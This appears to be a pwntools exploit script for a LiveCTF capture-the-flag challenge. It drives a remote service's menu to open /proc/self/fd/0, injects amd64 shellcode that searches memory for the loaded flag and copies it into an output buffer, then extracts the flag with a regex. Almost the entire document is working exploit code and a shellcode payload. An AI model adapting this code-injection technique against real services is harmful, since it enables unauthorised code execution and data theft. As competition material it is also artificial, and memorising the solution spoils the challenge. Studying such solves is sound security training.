#!/usr/bin/env python3

from pwn import *
import re

context.arch = "amd64"
# context.log_level = "DEBUG"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/flag")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/flag")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/proc/self/fd/0")

r.send(asm("""
    call A
A:
    pop rdx
ZALOOP:
    mov rax, 8882879963476683084
    cmp QWORD PTR [rdx], rax
    je FOUND
    dec rdx
    jmp ZALOOP
FOUND:
    mov rdi, QWORD PTR [rdx]
    
    mov rsi, rbp
    sub rsi, 0x28
    mov rsi, QWORD PTR [rsi]
    add rsi, 0x0c
    mov rdi, QWORD PTR [rdx]
    mov QWORD PTR [rsi], rdi
    mov rdi, QWORD PTR [rdx+8]
    mov QWORD PTR [rsi+8], rdi
    mov rdi, QWORD PTR [rdx+16]
    mov QWORD PTR [rsi+16], rdi
    mov rdi, QWORD PTR [rdx+24]
    mov QWORD PTR [rsi+24], rdi
    mov rdi, QWORD PTR [rdx+32]
    mov QWORD PTR [rsi+32], rdi
    mov rdi, QWORD PTR [rdx+40]
    mov QWORD PTR [rsi+40], rdi
    mov rdi, QWORD PTR [rdx+48]
    mov QWORD PTR [rsi+48], rdi
    mov rdi, QWORD PTR [rdx+56]
    mov QWORD PTR [rsi+56], rdi
    ret
"""))

r.sendlineafter(b"Choice:", b"2")

print(re.findall(rb'LiveCTF{[^}{}]+}', r.recvall(timeout=3))[0].decode())
